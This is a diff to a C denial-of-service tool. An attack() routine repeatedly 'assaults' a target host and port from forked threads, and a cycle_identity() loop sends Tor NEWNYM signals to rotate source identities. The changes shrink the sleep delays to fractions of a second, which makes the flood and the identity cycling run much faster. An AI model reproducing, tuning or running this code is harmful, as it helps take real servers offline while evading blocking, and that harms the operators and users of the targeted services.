@@ -71,7 +71,7 @@ void attack(char *host, char *port, int id) {
 			fprintf(stderr, "[%i: Assaulting Server]\n", id);
 		}
 		fprintf(stderr, "[%i: Assaulting Server]\n", id);
-		usleep(300000000);
+		usleep(300000);
 	}
 }
 
@@ -82,7 +82,7 @@ void cycle_identity() {
 	while(1) {
 		r=write(socket, "signal NEWNYM\n\x00", 16);
 		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
-		usleep(30000000000);
+		usleep(300000);
 	}
 }
 
@@ -93,7 +93,7 @@ int main(int argc, char **argv) {
 	for(x=0; x != THREADS; x++) {
 		if(fork())
 			attack(argv[1], argv[2], x);
-		usleep(20000000000);
+		usleep(200000);
 	}
 	getc(stdin);
 	return 0;
